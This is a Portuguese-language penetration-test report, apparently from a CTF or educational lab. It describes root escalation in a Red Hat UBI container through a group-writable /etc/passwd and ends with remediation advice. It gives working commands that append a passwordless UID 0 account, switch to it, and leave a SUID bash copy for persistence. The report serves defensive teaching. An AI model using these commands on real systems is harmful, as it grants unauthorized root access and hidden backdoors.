# Relatório de Teste de Intrusão (Pentest)

**Tema:** Escalação de Privilégios em Container Linux (Red Hat UBI)

**Autor:** Marcos Leal  
**Data:** 01 de janeiro de 2026  
**Tipo:** CTF / Laboratório Educacional

---

## 1. Sumário Executivo

Durante a avaliação de segurança de um ambiente containerizado baseado em Red Hat Universal Base Image (RHEL UBI), foi identificada uma **falha crítica de configuração** relacionada à gestão de permissões de ficheiros e associação indevida de utilizadores ao grupo privilegiado **root (GID 0)**.

Um utilizador não privilegiado conseguiu explorar permissões de escrita no ficheiro **/etc/passwd**, criando uma conta alternativa com **UID 0**, o que resultou na obtenção de **privilégios administrativos completos (root)** dentro do container.

A vulnerabilidade permitiu o comprometimento total da integridade do sistema, apesar da presença de controlos compensatórios modernos, como restrições de *Linux Capabilities* e políticas *SELinux*.

**Classificação:** Crítica  
**Impacto:** Compromisso total do container  
**Probabilidade:** Elevada

---

## 2. Análise Técnica (Passo a Passo)

### 2.1 Fase 1 – Reconhecimento e Enumeração

O acesso inicial foi obtido através de um *shell* restrito. A enumeração inicial teve como objetivo identificar o contexto de execução e as permissões do utilizador corrente.

**Comando executado:**

```bash
id
```

**Resultado:**

```bash
uid=1005440000(user) gid=0(root) groups=0(root),1005440000(user)
```

**Análise:**
Embora o utilizador possua um UID elevado (não privilegiado), encontra-se associado ao grupo **root (GID 0)**. Esta configuração é relativamente comum em ambientes OpenShift, mas introduz riscos significativos quando combinada com permissões incorretas no sistema de ficheiros.

---

### 2.2 Identificação da Vulnerabilidade

**Comando executado:**

```bash
ls -l /etc/passwd
```

**Resultado:**

```bash
-rw-rw-r--. 1 root root 911 Dec 31 23:03 /etc/passwd
```

**Vulnerabilidade Identificada:**
O ficheiro **/etc/passwd** possui permissões de escrita para o grupo (**rw-rw-r--**). Uma vez que o utilizador pertence ao grupo root, é possível modificar diretamente a base de dados de utilizadores do sistema.

---

### 2.3 Fase 2 – Tentativas Iniciais de Exploração

Foram inicialmente testadas abordagens alternativas:

* Exploração via *User Namespaces*;
* Injeção de código em scripts de inicialização (*entrypoint*).

**Resultado:**
A injeção foi bem-sucedida, porém não persistente. O container apresentou comportamento **stateless**, e qualquer reinício resultou na perda das alterações efetuadas.

**Lição Aprendida:**
Em ambientes efémeros, a exploração deve ocorrer **em tempo de execução (runtime)**, sem dependência de persistência em disco ou reinicializações.

---

### 2.4 Fase 3 – Exploração Bem-Sucedida

A exploração concentrou-se na modificação direta do ficheiro **/etc/passwd**.

**Ação Executada:**
Criação de um utilizador alternativo com **UID 0**, contornando o controlo de autenticação via **/etc/shadow**.

```bash
echo "toor::0:0:root:/root:/bin/bash" >> /etc/passwd
```

**Elevação de Privilégios:**

```bash
su toor
```

*(Autenticação sem necessidade de palavra-passe)*

**Verificação:**

```bash
id
```

```bash
uid=0(root) gid=0(root) groups=0(root)
```

**Estado:** Acesso root confirmado.

---

### 2.5 Fase 4 – Pós-Exploração e Persistência

Para facilitar o acesso privilegiado sem depender de uma conta facilmente detetável, foi criado um binário com o bit **SUID**.

**Ação Executada:**

```bash
cp /bin/bash /projects/rootbash
chmod +s /projects/rootbash
```

**Resultado:**
A execução de `/projects/rootbash -p` concede privilégios de root (**euid=0**) a qualquer utilizador.

---

### 2.6 Fase 5 – Análise de Defesas Existentes

Mesmo com privilégios de UID 0, determinadas ações foram bloqueadas:

* Leitura de `/etc/shadow`: *Permission denied*;
* Execução de `chown`: *Operation not permitted*.

**Conclusão Técnica:**
O container encontra-se protegido por:

* Remoção de *Linux Capabilities* sensíveis (ex.: `CAP_CHOWN`, `CAP_DAC_READ_SEARCH`);
* Políticas restritivas de **SELinux**.

Contudo, a possibilidade de escrita em **/etc/passwd** foi suficiente para comprometer o sistema, contornando eficazmente as proteções aplicadas ao **/etc/shadow**.

---

## 3. Remediação e Mitigação

As seguintes medidas são recomendadas para eliminação da vulnerabilidade:

* Ajustar permissões do ficheiro **/etc/passwd** para `644`;
* Remover utilizadores não administrativos do grupo **root (GID 0)**;
* Aplicar sistemas de ficheiros **read-only** na raiz do container;
* Reforçar políticas de *SecurityContext* e *Pod Security Standards*.

---

## 4. Âmbito do Teste

O teste foi conduzido exclusivamente dentro do container atribuído no ambiente **Red Hat Developer Sandbox**. Não foram realizadas tentativas de *container escape* nem ações contra o *host* ou *node* subjacente.

Todas as alterações efetuadas para prova de conceito foram removidas após a validação.

---

## 5. Conclusão e Parecer Final

Este teste de intrusão demonstrou que a segurança de containers depende fundamentalmente de **configurações rigorosas de permissões**, e não apenas da imagem base ou do kernel subjacente.

A vulnerabilidade explorada — **Escalação de Privilégios por Misconfiguration** — foi classificada como **CRÍTICA**, pois permitiu o controlo total do container através de um vetor de ataque simples e altamente eficaz.

Apesar da presença de mecanismos modernos de defesa (*SELinux* e *Linux Capabilities*), uma única falha de permissões foi suficiente para comprometer toda a superfície de segurança.

Este cenário reforça o princípio de **Defesa em Profundidade (Defense in Depth)**: a ausência ou falha de uma camada não deve resultar no colapso completo do sistema.

---

**Parecer Final:**
A imagem e o ambiente analisados requerem correções imediatas de configuração para mitigar riscos críticos de escalonamento de privilégios em ambientes containerizados.
